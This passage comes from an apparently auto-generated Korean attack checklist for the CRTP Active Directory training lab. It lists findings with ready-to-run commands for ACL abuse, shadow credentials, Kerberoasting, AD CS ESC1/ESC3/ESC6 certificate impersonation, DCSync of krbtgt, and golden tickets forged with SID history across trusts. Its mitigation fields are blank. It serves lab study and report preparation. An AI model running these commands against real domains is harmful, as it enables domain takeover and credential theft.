- 🛡 **완화 방안(본인 조사·인용)**: > _방어책_

### [HIGH] ACL abuse: WriteDacl  (prio 25)
- **대상**: DEVOPS POLICY@DOLLARCORP.MONEYCORP.LOCAL
- **근거(데이터)**: DEVOPSADMIN@DOLLARCORP.MONEYCORP.LOCAL has WriteDacl over DEVOPS POLICY@DOLLARCORP.MONEYCORP.LOCAL
- 🛠 **명령어**:
  - _PowerView_:
    ```
    # 소유권/DACL 장악 후 권한 부여
    ```
    ```
    Set-DomainObjectOwner -Identity DEVOPS POLICY@DOLLARCORP.MONEYCORP.LOCAL -OwnerIdentity <you>
    ```
    ```
    Add-DomainObjectAcl -TargetIdentity DEVOPS POLICY@DOLLARCORP.MONEYCORP.LOCAL -PrincipalIdentity <you> -Rights All
    ```
- ✅ **확인(VERIFY)**:
  - [ ] DEVOPSADMIN@DOLLARCORP.MONEYCORP.LOCAL 를 실제로 제어 가능한지 (현재 컨텍스트/크랙된 자격)
  - [ ] 권한 행사 후 대상에 대한 실질적 접근 획득 확인
- 🎯 **증명(PROOF)**: 위 '확인' 항목이 충족되면 → **ACL abuse: WriteDacl** 이(가) `DEVOPS POLICY@DOLLARCORP.MONEYCORP.LOCAL` 에 대해 실제로 성립함을 입증 (심각도 HIGH).
- 📸 **스크린샷**:
  - [ ] ACL 확인: Get-DomainObjectAcl -Identity DEVOPS POLICY@DOLLARCORP.MONEYCORP.LOCAL 출력
  - [ ] 권한 남용 실행 화면 (그룹 추가 / 패스워드 변경 등)
  - [ ] 남용 후 획득한 접근 증명 화면
- _참고(사실): DEVOPSADMIN@DOLLARCORP.MONEYCORP.LOCAL -(WriteDacl)-> DEVOPS POLICY@DOLLARCORP.MONEYCORP.LOCAL. CRTP 경로에서 자주 나오는 ACL 체인._
- 🖊 **내 설명(본인 문장)**: > _이 명령이 무엇을 하고 왜 통했는가_
- 🛡 **완화 방안(본인 조사·인용)**: > _방어책_

### [HIGH] ACL abuse: WriteDacl  (prio 25)
- **대상**: RAS AND IAS SERVERS ACCESS CHECK@DOLLARCORP.MONEYCORP.LOCAL
- **근거(데이터)**: RAS AND IAS SERVERS@DOLLARCORP.MONEYCORP.LOCAL has WriteDacl over RAS AND IAS SERVERS ACCESS CHECK@DOLLARCORP.MONEYCORP.LOCAL
- 🛠 **명령어**:
  - _PowerView_:
    ```
    # 소유권/DACL 장악 후 권한 부여
    ```
    ```
    Set-DomainObjectOwner -Identity RAS AND IAS SERVERS ACCESS CHECK@DOLLARCORP.MONEYCORP.LOCAL -OwnerIdentity <you>
    ```
    ```
    Add-DomainObjectAcl -TargetIdentity RAS AND IAS SERVERS ACCESS CHECK@DOLLARCORP.MONEYCORP.LOCAL -PrincipalIdentity <you> -Rights All
    ```
- ✅ **확인(VERIFY)**:
  - [ ] RAS AND IAS SERVERS@DOLLARCORP.MONEYCORP.LOCAL 를 실제로 제어 가능한지 (현재 컨텍스트/크랙된 자격)
  - [ ] 권한 행사 후 대상에 대한 실질적 접근 획득 확인
- 🎯 **증명(PROOF)**: 위 '확인' 항목이 충족되면 → **ACL abuse: WriteDacl** 이(가) `RAS AND IAS SERVERS ACCESS CHECK@DOLLARCORP.MONEYCORP.LOCAL` 에 대해 실제로 성립함을 입증 (심각도 HIGH).
- 📸 **스크린샷**:
  - [ ] ACL 확인: Get-DomainObjectAcl -Identity RAS AND IAS SERVERS ACCESS CHECK@DOLLARCORP.MONEYCORP.LOCAL 출력
  - [ ] 권한 남용 실행 화면 (그룹 추가 / 패스워드 변경 등)
  - [ ] 남용 후 획득한 접근 증명 화면
- _참고(사실): RAS AND IAS SERVERS@DOLLARCORP.MONEYCORP.LOCAL -(WriteDacl)-> RAS AND IAS SERVERS ACCESS CHECK@DOLLARCORP.MONEYCORP.LOCAL. CRTP 경로에서 자주 나오는 ACL 체인._
- 🖊 **내 설명(본인 문장)**: > _이 명령이 무엇을 하고 왜 통했는가_
- 🛡 **완화 방안(본인 조사·인용)**: > _방어책_

### [HIGH] ACL abuse: WriteOwner  (prio 25)
- **대상**: DEVOPS POLICY@DOLLARCORP.MONEYCORP.LOCAL
- **근거(데이터)**: DEVOPSADMIN@DOLLARCORP.MONEYCORP.LOCAL has WriteOwner over DEVOPS POLICY@DOLLARCORP.MONEYCORP.LOCAL
- 🛠 **명령어**:
  - _PowerView_:
    ```
    # 소유권/DACL 장악 후 권한 부여
    ```
    ```
    Set-DomainObjectOwner -Identity DEVOPS POLICY@DOLLARCORP.MONEYCORP.LOCAL -OwnerIdentity <you>
    ```
    ```
    Add-DomainObjectAcl -TargetIdentity DEVOPS POLICY@DOLLARCORP.MONEYCORP.LOCAL -PrincipalIdentity <you> -Rights All
    ```
- ✅ **확인(VERIFY)**:
  - [ ] DEVOPSADMIN@DOLLARCORP.MONEYCORP.LOCAL 를 실제로 제어 가능한지 (현재 컨텍스트/크랙된 자격)
  - [ ] 권한 행사 후 대상에 대한 실질적 접근 획득 확인
- 🎯 **증명(PROOF)**: 위 '확인' 항목이 충족되면 → **ACL abuse: WriteOwner** 이(가) `DEVOPS POLICY@DOLLARCORP.MONEYCORP.LOCAL` 에 대해 실제로 성립함을 입증 (심각도 HIGH).
- 📸 **스크린샷**:
  - [ ] ACL 확인: Get-DomainObjectAcl -Identity DEVOPS POLICY@DOLLARCORP.MONEYCORP.LOCAL 출력
  - [ ] 권한 남용 실행 화면 (그룹 추가 / 패스워드 변경 등)
  - [ ] 남용 후 획득한 접근 증명 화면
- _참고(사실): DEVOPSADMIN@DOLLARCORP.MONEYCORP.LOCAL -(WriteOwner)-> DEVOPS POLICY@DOLLARCORP.MONEYCORP.LOCAL. CRTP 경로에서 자주 나오는 ACL 체인._
- 🖊 **내 설명(본인 문장)**: > _이 명령이 무엇을 하고 왜 통했는가_
- 🛡 **완화 방안(본인 조사·인용)**: > _방어책_

### [HIGH] ACL abuse: WriteOwner  (prio 25)
- **대상**: RAS AND IAS SERVERS ACCESS CHECK@DOLLARCORP.MONEYCORP.LOCAL
- **근거(데이터)**: RAS AND IAS SERVERS@DOLLARCORP.MONEYCORP.LOCAL has WriteOwner over RAS AND IAS SERVERS ACCESS CHECK@DOLLARCORP.MONEYCORP.LOCAL
- 🛠 **명령어**:
  - _PowerView_:
    ```
    # 소유권/DACL 장악 후 권한 부여
    ```
    ```
    Set-DomainObjectOwner -Identity RAS AND IAS SERVERS ACCESS CHECK@DOLLARCORP.MONEYCORP.LOCAL -OwnerIdentity <you>
    ```
    ```
    Add-DomainObjectAcl -TargetIdentity RAS AND IAS SERVERS ACCESS CHECK@DOLLARCORP.MONEYCORP.LOCAL -PrincipalIdentity <you> -Rights All
    ```
- ✅ **확인(VERIFY)**:
  - [ ] RAS AND IAS SERVERS@DOLLARCORP.MONEYCORP.LOCAL 를 실제로 제어 가능한지 (현재 컨텍스트/크랙된 자격)
  - [ ] 권한 행사 후 대상에 대한 실질적 접근 획득 확인
- 🎯 **증명(PROOF)**: 위 '확인' 항목이 충족되면 → **ACL abuse: WriteOwner** 이(가) `RAS AND IAS SERVERS ACCESS CHECK@DOLLARCORP.MONEYCORP.LOCAL` 에 대해 실제로 성립함을 입증 (심각도 HIGH).
- 📸 **스크린샷**:
  - [ ] ACL 확인: Get-DomainObjectAcl -Identity RAS AND IAS SERVERS ACCESS CHECK@DOLLARCORP.MONEYCORP.LOCAL 출력
  - [ ] 권한 남용 실행 화면 (그룹 추가 / 패스워드 변경 등)
  - [ ] 남용 후 획득한 접근 증명 화면
- _참고(사실): RAS AND IAS SERVERS@DOLLARCORP.MONEYCORP.LOCAL -(WriteOwner)-> RAS AND IAS SERVERS ACCESS CHECK@DOLLARCORP.MONEYCORP.LOCAL. CRTP 경로에서 자주 나오는 ACL 체인._
- 🖊 **내 설명(본인 문장)**: > _이 명령이 무엇을 하고 왜 통했는가_
- 🛡 **완화 방안(본인 조사·인용)**: > _방어책_

### [HIGH] ACL abuse: GenericAll (bulk — 41 targets)  (prio 26)
- **대상**: CONTROL201USER@DOLLARCORP.MONEYCORP.LOCAL, CONTROL202USER@DOLLARCORP.MONEYCORP.LOCAL, CONTROL203USER@DOLLARCORP.MONEYCORP.LOCAL, CONTROL204USER@DOLLARCORP.MONEYCORP.LOCAL, CONTROL205USER@DOLLARCORP.MONEYCORP.LOCAL, CONTROL206USER@DOLLARCORP.MONEYCORP.LOCAL, CONTROL207USER@DOLLARCORP.MONEYCORP.LOCAL, CONTROL208USER@DOLLARCORP.MONEYCORP.LOCAL, CONTROL209USER@DOLLARCORP.MONEYCORP.LOCAL, CONTROL210USER@DOLLARCORP.MONEYCORP.LOCAL, CONTROL211USER@DOLLARCORP.MONEYCORP.LOCAL, CONTROL212USER@DOLLARCORP.MONEYCORP.LOCAL, CONTROL213USER@DOLLARCORP.MONEYCORP.LOCAL, CONTROL214USER@DOLLARCORP.MONEYCORP.LOCAL, CONTROL215USER@DOLLARCORP.MONEYCORP.LOCAL, CONTROL216USER@DOLLARCORP.MONEYCORP.LOCAL, CONTROL217USER@DOLLARCORP.MONEYCORP.LOCAL, CONTROL218USER@DOLLARCORP.MONEYCORP.LOCAL, CONTROL219USER@DOLLARCORP.MONEYCORP.LOCAL, CONTROL220USER@DOLLARCORP.MONEYCORP.LOCAL, SUPPORT201USER@DOLLARCORP.MONEYCORP.LOCAL, SUPPORT202USER@DOLLARCORP.MONEYCORP.LOCAL, SUPPORT203USER@DOLLARCORP.MONEYCORP.LOCAL, SUPPORT204USER@DOLLARCORP.MONEYCORP.LOCAL, SUPPORT205USER@DOLLARCORP.MONEYCORP.LOCAL, SUPPORT206USER@DOLLARCORP.MONEYCORP.LOCAL, SUPPORT207USER@DOLLARCORP.MONEYCORP.LOCAL, SUPPORT208USER@DOLLARCORP.MONEYCORP.LOCAL, SUPPORT209USER@DOLLARCORP.MONEYCORP.LOCAL, SUPPORT210USER@DOLLARCORP.MONEYCORP.LOCAL, SUPPORT211USER@DOLLARCORP.MONEYCORP.LOCAL, SUPPORT212USER@DOLLARCORP.MONEYCORP.LOCAL, SUPPORT213USER@DOLLARCORP.MONEYCORP.LOCAL, SUPPORT214USER@DOLLARCORP.MONEYCORP.LOCAL, SUPPORT215USER@DOLLARCORP.MONEYCORP.LOCAL, SUPPORT216USER@DOLLARCORP.MONEYCORP.LOCAL, SUPPORT217USER@DOLLARCORP.MONEYCORP.LOCAL, SUPPORT218USER@DOLLARCORP.MONEYCORP.LOCAL, SUPPORT219USER@DOLLARCORP.MONEYCORP.LOCAL, SUPPORT220USER@DOLLARCORP.MONEYCORP.LOCAL, APPLOCKER@DOLLARCORP.MONEYCORP.LOCAL
- **근거(데이터)**: RDPUSERS@DOLLARCORP.MONEYCORP.LOCAL has GenericAll over 41 objects: CONTROL201USER@DOLLARCORP.MONEYCORP.LOCAL, CONTROL202USER@DOLLARCORP.MONEYCORP.LOCAL, CONTROL203USER@DOLLARCORP.MONEYCORP.LOCAL, CONTROL204USER@DOLLARCORP.MONEYCORP.LOCAL, CONTROL205USER@DOLLARCORP.MONEYCORP.LOCAL, CONTROL206USER@DOLLARCORP.MONEYCORP.LOCAL … (+35 more)
- 🛠 **명령어**:
  - _Targeted (choose one)_:
    ```
    # 옵션 A: 패스워드 리셋
    ```
    ```
    Set-DomainUserPassword -Identity Control201user -AccountPassword (ConvertTo-SecureString '<NewPass123!>' -AsPlainText -Force)
    ```
    ```
    # 옵션 B: Targeted Kerberoast (SPN 부여 후 로스팅)
    ```
    ```
    Set-DomainObject -Identity Control201user -Set @{serviceprincipalname='fake/svc'}
    ```
    ```
    Rubeus.exe kerberoast /user:Control201user /nowrap
    ```
    ```
    # 옵션 C: Shadow Credentials
    ```
    ```
    Whisker.exe add /target:Control201user
    ```
- ✅ **확인(VERIFY)**:
  - [ ] RDPUSERS@DOLLARCORP.MONEYCORP.LOCAL 를 실제로 제어 가능한지 (현재 컨텍스트/크랙된 자격)
  - [ ] 경로에 필요한 대상 1개만 선택해 권한 행사 (전부 할 필요 없음)
- 🎯 **증명(PROOF)**: 위 '확인' 항목이 충족되면 → **ACL abuse: GenericAll (bulk — 41 targets)** 이(가) `CONTROL201USER@DOLLARCORP.MONEYCORP.LOCAL, CONTROL202USER@DOLLARCORP.MONEYCORP.LOCAL, CONTROL203USER@DOLLARCORP.MONEYCORP.LOCAL …` 에 대해 실제로 성립함을 입증 (심각도 HIGH).
- 📸 **스크린샷**:
  - [ ] ACL 확인 출력 (대표 대상 1개)
  - [ ] 권한 남용 실행 화면
  - [ ] 남용 후 획득 접근 증명 화면
- _참고(사실): RDPUSERS@DOLLARCORP.MONEYCORP.LOCAL 가 41개 객체에 GenericAll — 보통 그룹 권한으로 일괄 부여된 관계. 경로에 필요한 대상만 선택적으로 악용._
- 🖊 **내 설명(본인 문장)**: > _이 명령이 무엇을 하고 왜 통했는가_
- 🛡 **완화 방안(본인 조사·인용)**: > _방어책_

### [INFO] Unconstrained Delegation abuse  (prio 80)
- **대상**: DCORP-DC$
- **근거(데이터)**: DCORP-DC$ (computer) TRUSTED_FOR_DELEGATION [DC — expected]
- 🛠 **명령어**:
  - _Enum (PowerView)_:
    ```
    Get-DomainComputer -Unconstrained | select samaccountname
    ```
    ```
    Get-DomainUser -TrustedToAuth | select samaccountname
    ```
  - _Rubeus monitor_:
    ```
    Rubeus.exe monitor /interval:5 /nowrap
    ```
  - _Coerce (auth)_:
    ```
    # PetitPotam / SpoolSample 로 DC 인증 강제 → TGT 캡처
    ```
    ```
    Rubeus.exe tgtdeleg
    ```
  - _PTT_:
    ```
    Rubeus.exe ptt /ticket:<base64_TGT>
    ```
- ✅ **확인(VERIFY)**:
  - [ ] 해당 호스트에 로컬 관리자 권한이 있는지 (티켓 모니터링 전제)
  - [ ] 캡처된 TGT의 주체가 특권 계정/DC 컴퓨터 계정인지
- 🎯 **증명(PROOF)**: 위 '확인' 항목이 충족되면 → **Unconstrained Delegation abuse** 이(가) `DCORP-DC$` 에 대해 실제로 성립함을 입증 (심각도 INFO).
- 📸 **스크린샷**:
  - [ ] DCORP-DC$ Unconstrained delegation 속성 확인
  - [ ] Rubeus monitor 로 캡처된 TGT 화면
  - [ ] PTT 후 특권 접근 확인 (예: DCSync 또는 DC 접근)
- _참고(사실): 비-DC 호스트의 무제약 위임은 치명적. DC 인증 강제 후 TGT 탈취 경로._
- 🖊 **내 설명(본인 문장)**: > _이 명령이 무엇을 하고 왜 통했는가_
- 🛡 **완화 방안(본인 조사·인용)**: > _방어책_

## PHASE 6. AD CS 권한상승 후보 — ESC1/3/4/6 (교차도메인 가능)

### [CRITICAL] AD CS ESC1 — template 'ESC1-User'  (prio 7)
- **대상**: ESC1-User @ mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
- **근거(데이터)**: ESC1: template 'ESC1-User' on CA 'mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA'. 악용 가능 주체: dcorp\RDPUsers, mcorp\Domain Users
- 🛠 **명령어**:
  - _Certify request_:
    ```
    Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:ESC1-User /altname:administrator@moneycorp.local
    ```
  - _pfx 변환_:
    ```
    openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out esc1.pfx
    ```
  - _Rubeus asktgt_:
    ```
    Rubeus.exe asktgt /user:administrator /certificate:esc1.pfx /password:<pfx_pw> /domain:moneycorp.local /dc:mcorp-dc.moneycorp.local /ptt
    ```
- ✅ **확인(VERIFY)**:
  - [ ] 현재 계정이 dcorp\RDPUsers, mcorp\Domain Users 에 속하는지
  - [ ] 인증서 request 성공 여부
  - [ ] 발급 인증서로 특권 사용자 TGT 획득(klist) 및 대상 접근
- 🎯 **증명(PROOF)**: 위 '확인' 항목이 충족되면 → **AD CS ESC1 — template 'ESC1-User'** 이(가) `ESC1-User @ mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA` 에 대해 실제로 성립함을 입증 (심각도 CRITICAL).
- 📸 **스크린샷**:
  - [ ] Certify find /vulnerable 에 'ESC1-User' ESC1 조건 보이는 화면
  - [ ] ESC1 request 성공 (인증서 발급) 화면
  - [ ] asktgt /ptt 후 klist + 대상 DC 접근 화면
- _참고(사실): 템플릿이 ENROLLEE_SUPPLIES_SUBJECT + client-auth EKU + 승인0 + 저권한 enroll → 임의 사용자(DA/EA) SAN으로 인증서 발급 후 그 사용자로 인증._
- 🖊 **내 설명(본인 문장)**: > _이 명령이 무엇을 하고 왜 통했는가_
- 🛡 **완화 방안(본인 조사·인용)**: > _방어책_

### [CRITICAL] AD CS ESC3 — template 'SmartCardEnrollment-Agent'  (prio 7)
- **대상**: SmartCardEnrollment-Agent @ mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
- **근거(데이터)**: ESC3: template 'SmartCardEnrollment-Agent' on CA 'mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA'. 악용 가능 주체: dcorp\Domain Users
- 🛠 **명령어**:
  - _1) EA 인증서 발급_:
    ```
    Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Agent
    ```
  - _2) on-behalf-of 요청_:
    ```
    Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:<client-auth 템플릿> /onbehalfof:moneycorp\administrator /enrollcert:ea.pfx /enrollcertpw:<pw>
    ```
  - _3) asktgt_:
    ```
    Rubeus.exe asktgt /user:administrator /certificate:onbehalf.pfx /domain:moneycorp.local /dc:mcorp-dc.moneycorp.local /ptt
    ```
- ✅ **확인(VERIFY)**:
  - [ ] 현재 계정이 dcorp\Domain Users 에 속하는지
  - [ ] 인증서 request 성공 여부
  - [ ] 발급 인증서로 특권 사용자 TGT 획득(klist) 및 대상 접근
- 🎯 **증명(PROOF)**: 위 '확인' 항목이 충족되면 → **AD CS ESC3 — template 'SmartCardEnrollment-Agent'** 이(가) `SmartCardEnrollment-Agent @ mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA` 에 대해 실제로 성립함을 입증 (심각도 CRITICAL).
- 📸 **스크린샷**:
  - [ ] Certify find /vulnerable 에 'SmartCardEnrollment-Agent' ESC3 조건 보이는 화면
  - [ ] ESC3 request 성공 (인증서 발급) 화면
  - [ ] asktgt /ptt 후 klist + 대상 DC 접근 화면
- _참고(사실): Enrollment Agent 템플릿(Certificate Request Agent EKU)을 저권한이 enroll 가능 → EA 인증서로 특권 사용자 대신 client-auth 인증서 요청._
- 🖊 **내 설명(본인 문장)**: > _이 명령이 무엇을 하고 왜 통했는가_
- 🛡 **완화 방안(본인 조사·인용)**: > _방어책_

### [CRITICAL] AD CS ESC6 — CA allows requester-specified SAN (EDITF_ATTRIBUTESUBJECTALTNAME2)  (prio 9)
- **대상**: mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
- **근거(데이터)**: CA 'mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA' has EDITF_ATTRIBUTESUBJECTALTNAME2 set — any enrollable client-auth template can specify an arbitrary SAN
- 🛠 **명령어**:
  - _Certify (any client-auth template)_:
    ```
    Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:<enrollable_clientauth_tpl> /altname:administrator@moneycorp.local
    ```
  - _asktgt_:
    ```
    Rubeus.exe asktgt /user:administrator /certificate:esc6.pfx /password:<pfx_pw> /domain:moneycorp.local /ptt
    ```
- ✅ **확인(VERIFY)**:
  - [ ] CA 플래그에 EDITF_ATTRIBUTESUBJECTALTNAME2 확인
  - [ ] enroll 가능한 client-auth 템플릿 식별
  - [ ] 발급 인증서로 특권 사용자 인증 성공
- 🎯 **증명(PROOF)**: 위 '확인' 항목이 충족되면 → **AD CS ESC6 — CA allows requester-specified SAN (EDITF_ATTRIBUTESUBJECTALTNAME2)** 이(가) `mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA` 에 대해 실제로 성립함을 입증 (심각도 CRITICAL).
- 📸 **스크린샷**:
  - [ ] Certify find 에서 'mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA' UserSpecifiedSAN 표시 화면
  - [ ] altname 지정 request 성공 화면
  - [ ] asktgt /ptt + klist 화면
- _참고(사실): CA 'mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA' 레벨 SAN 악용(ESC6). 2022 패치 후에도 플래그가 켜져 있으면 유효._
- 🖊 **내 설명(본인 문장)**: > _이 명령이 무엇을 하고 왜 통했는가_
- 🛡 **완화 방안(본인 조사·인용)**: > _방어책_

## PHASE 7. 자격 탈취·지속성 후보 — DCSync

### [CRITICAL] DCSync  (prio 8)
- **대상**: S-1-5-21-335606122-960912869-3279953914-498
- **근거(데이터)**: S-1-5-21-335606122-960912869-3279953914-498 holds ['GetChanges'] on DOLLARCORP.MONEYCORP.LOCAL
- 🛠 **명령어**:
  - _mimikatz_:
    ```
    lsadump::dcsync /user:DOLLARCORP.MONEYCORP.LOCAL\krbtgt
    ```
    ```
    lsadump::dcsync /user:DOLLARCORP.MONEYCORP.LOCAL\Administrator
    ```
  - _Rubeus/secretsdump_:
    ```
    # 대안: secretsdump.py -just-dc <dom>/<user>@<dc>
    ```
- ✅ **확인(VERIFY)**:
  - [ ] 현재 컨텍스트가 S-1-5-21-335606122-960912869-3279953914-498 인지/될 수 있는지
  - [ ] krbtgt 해시 확보 여부 (Golden Ticket 전제)
- 🎯 **증명(PROOF)**: 위 '확인' 항목이 충족되면 → **DCSync** 이(가) `S-1-5-21-335606122-960912869-3279953914-498` 에 대해 실제로 성립함을 입증 (심각도 CRITICAL).
- 📸 **스크린샷**:
  - [ ] S-1-5-21-335606122-960912869-3279953914-498 의 GetChanges/GetChangesAll 권한 확인 (Get-DomainObjectAcl)
  - [ ] dcsync 로 krbtgt 해시 덤프 화면
- _참고(사실): DCSync 권한 → krbtgt 해시 → Golden Ticket 로 도메인 지속성._
- 🖊 **내 설명(본인 문장)**: > _이 명령이 무엇을 하고 왜 통했는가_
- 🛡 **완화 방안(본인 조사·인용)**: > _방어책_

### [CRITICAL] DCSync  (prio 8)
- **대상**: DOMAIN CONTROLLERS@DOLLARCORP.MONEYCORP.LOCAL
- **근거(데이터)**: DOMAIN CONTROLLERS@DOLLARCORP.MONEYCORP.LOCAL holds ['GetChangesAll'] on DOLLARCORP.MONEYCORP.LOCAL
- 🛠 **명령어**:
  - _mimikatz_:
    ```
    lsadump::dcsync /user:DOLLARCORP.MONEYCORP.LOCAL\krbtgt
    ```
    ```
    lsadump::dcsync /user:DOLLARCORP.MONEYCORP.LOCAL\Administrator
    ```
  - _Rubeus/secretsdump_:
    ```
    # 대안: secretsdump.py -just-dc <dom>/<user>@<dc>
    ```
- ✅ **확인(VERIFY)**:
  - [ ] 현재 컨텍스트가 DOMAIN CONTROLLERS@DOLLARCORP.MONEYCORP.LOCAL 인지/될 수 있는지
  - [ ] krbtgt 해시 확보 여부 (Golden Ticket 전제)
- 🎯 **증명(PROOF)**: 위 '확인' 항목이 충족되면 → **DCSync** 이(가) `DOMAIN CONTROLLERS@DOLLARCORP.MONEYCORP.LOCAL` 에 대해 실제로 성립함을 입증 (심각도 CRITICAL).
- 📸 **스크린샷**:
  - [ ] DOMAIN CONTROLLERS@DOLLARCORP.MONEYCORP.LOCAL 의 GetChanges/GetChangesAll 권한 확인 (Get-DomainObjectAcl)
  - [ ] dcsync 로 krbtgt 해시 덤프 화면
- _참고(사실): DCSync 권한 → krbtgt 해시 → Golden Ticket 로 도메인 지속성._
- 🖊 **내 설명(본인 문장)**: > _이 명령이 무엇을 하고 왜 통했는가_
- 🛡 **완화 방안(본인 조사·인용)**: > _방어책_

## PHASE 8. 교차 도메인 후보 — Trust

### [HIGH] Domain/Forest trust abuse  (prio 12)
- **대상**: EUROCORP.LOCAL
- **근거(데이터)**: DOLLARCORP.MONEYCORP.LOCAL <-> EUROCORP.LOCAL dir=3 type=4 transitive=True SIDfilter=ON targetSID=S-1-5-21-3333069040-3914854601-3606488808
- 🛠 **명령어**:
  - _Enum_:
    ```
    Get-DomainTrust
    ```
    ```
    Get-DomainTrustMapping
    ```
    ```
    Get-ADTrust -Filter *
    ```
  - _SID history (⚠ SID filtering ON — 차단 가능성)_:
    ```
    # 이 트러스트는 SID filtering 켜짐 → SID history 주입이 필터될 수 있음
    ```
    ```
    # <child_krbtgt_hash> 는 DCSync 로 확보
    ```
    ```
    mimikatz: kerberos::golden /user:Administrator /domain:DOLLARCORP.MONEYCORP.LOCAL /sid:S-1-5-21-719815819-3726368948-3917688648 /krbtgt:<child_krbtgt_hash> /sids:S-1-5-21-3333069040-3914854601-3606488808-519 /ptt
    ```
  - _대상 도메인 추가 열거_:
    ```
    Get-DomainTrust -Domain EUROCORP.LOCAL
    ```
- ✅ **확인(VERIFY)**:
  - [ ] 신뢰 방향/타입(부모-자식 vs 포레스트)
  - [ ] SID filtering = ON (OFF여야 SID history 통함)
  - [ ] child krbtgt 해시 확보 여부
- 🎯 **증명(PROOF)**: 위 '확인' 항목이 충족되면 → **Domain/Forest trust abuse** 이(가) `EUROCORP.LOCAL` 에 대해 실제로 성립함을 입증 (심각도 HIGH).
- 📸 **스크린샷**:
  - [ ] Get-DomainTrustMapping 출력
  - [ ] 위조 티켓으로 대상 도메인 리소스 접근 화면
- _참고(사실): 대상 EUROCORP.LOCAL (SID S-1-5-21-3333069040-3914854601-3606488808). SID filtering=ON. OFF면 child krbtgt + 대상 EA SID(-519)로 inter-realm TGT 위조._
- 🖊 **내 설명(본인 문장)**: > _이 명령이 무엇을 하고 왜 통했는가_
- 🛡 **완화 방안(본인 조사·인용)**: > _방어책_

### [HIGH] Domain/Forest trust abuse  (prio 12)
- **대상**: MONEYCORP.LOCAL
- **근거(데이터)**: DOLLARCORP.MONEYCORP.LOCAL <-> MONEYCORP.LOCAL dir=3 type=0 transitive=True SIDfilter=OFF targetSID=S-1-5-21-335606122-960912869-3279953914
- 🛠 **명령어**:
  - _Enum_:
    ```
    Get-DomainTrust
    ```
    ```
    Get-DomainTrustMapping
    ```
    ```
    Get-ADTrust -Filter *
    ```
  - _SID history (SID filtering OFF — 사용 가능)_:
    ```
    # <child_krbtgt_hash> 는 DCSync 로 확보 (그 외 값은 데이터서 채움)
    ```
    ```
    mimikatz: kerberos::golden /user:Administrator /domain:DOLLARCORP.MONEYCORP.LOCAL /sid:S-1-5-21-719815819-3726368948-3917688648 /krbtgt:<child_krbtgt_hash> /sids:S-1-5-21-335606122-960912869-3279953914-519 /ptt
    ```
  - _대상 도메인 추가 열거_:
    ```
    Get-DomainTrust -Domain MONEYCORP.LOCAL
    ```
- ✅ **확인(VERIFY)**:
  - [ ] 신뢰 방향/타입(부모-자식 vs 포레스트)
  - [ ] SID filtering = OFF (OFF여야 SID history 통함)
  - [ ] child krbtgt 해시 확보 여부
- 🎯 **증명(PROOF)**: 위 '확인' 항목이 충족되면 → **Domain/Forest trust abuse** 이(가) `MONEYCORP.LOCAL` 에 대해 실제로 성립함을 입증 (심각도 HIGH).
- 📸 **스크린샷**:
  - [ ] Get-DomainTrustMapping 출력
  - [ ] 위조 티켓으로 대상 도메인 리소스 접근 화면
- _참고(사실): 대상 MONEYCORP.LOCAL (SID S-1-5-21-335606122-960912869-3279953914). SID filtering=OFF. OFF면 child krbtgt + 대상 EA SID(-519)로 inter-realm TGT 위조._
- 🖊 **내 설명(본인 문장)**: > _이 명령이 무엇을 하고 왜 통했는가_
- 🛡 **완화 방안(본인 조사·인용)**: > _방어책_

### [HIGH] Domain/Forest trust abuse  (prio 12)
- **대상**: US.DOLLARCORP.MONEYCORP.LOCAL
- **근거(데이터)**: DOLLARCORP.MONEYCORP.LOCAL <-> US.DOLLARCORP.MONEYCORP.LOCAL dir=3 type=0 transitive=True SIDfilter=OFF targetSID=S-1-5-21-1028785420-4100948154-1806204659
- 🛠 **명령어**:
  - _Enum_:
    ```
    Get-DomainTrust
    ```
    ```
    Get-DomainTrustMapping
    ```
    ```
    Get-ADTrust -Filter *
    ```
  - _SID history (SID filtering OFF — 사용 가능)_:
    ```
    # <child_krbtgt_hash> 는 DCSync 로 확보 (그 외 값은 데이터서 채움)
    ```
    ```
    mimikatz: kerberos::golden /user:Administrator /domain:DOLLARCORP.MONEYCORP.LOCAL /sid:S-1-5-21-719815819-3726368948-3917688648 /krbtgt:<child_krbtgt_hash> /sids:S-1-5-21-1028785420-4100948154-1806204659-519 /ptt
    ```
  - _대상 도메인 추가 열거_:
    ```
    Get-DomainTrust -Domain US.DOLLARCORP.MONEYCORP.LOCAL
    ```
- ✅ **확인(VERIFY)**:
  - [ ] 신뢰 방향/타입(부모-자식 vs 포레스트)
  - [ ] SID filtering = OFF (OFF여야 SID history 통함)
  - [ ] child krbtgt 해시 확보 여부
- 🎯 **증명(PROOF)**: 위 '확인' 항목이 충족되면 → **Domain/Forest trust abuse** 이(가) `US.DOLLARCORP.MONEYCORP.LOCAL` 에 대해 실제로 성립함을 입증 (심각도 HIGH).
- 📸 **스크린샷**:
  - [ ] Get-DomainTrustMapping 출력
  - [ ] 위조 티켓으로 대상 도메인 리소스 접근 화면
- _참고(사실): 대상 US.DOLLARCORP.MONEYCORP.LOCAL (SID S-1-5-21-1028785420-4100948154-1806204659). SID filtering=OFF. OFF면 child krbtgt + 대상 EA SID(-519)로 inter-realm TGT 위조._
- 🖊 **내 설명(본인 문장)**: > _이 명령이 무엇을 하고 왜 통했는가_
- 🛡 **완화 방안(본인 조사·인용)**: > _방어책_

## 호스트 레이어 (데이터 GAP — 각 호스트 수동 열거)
> SOAPHound/BloodHound 는 app/MSSQL/localpriv 를 못 봄. 아래는 **데이터의 SPN**에서 유추한 열거 후보.

- **DCORP-ADMINSRV$**: localpriv → `python localpriv.py --enum`
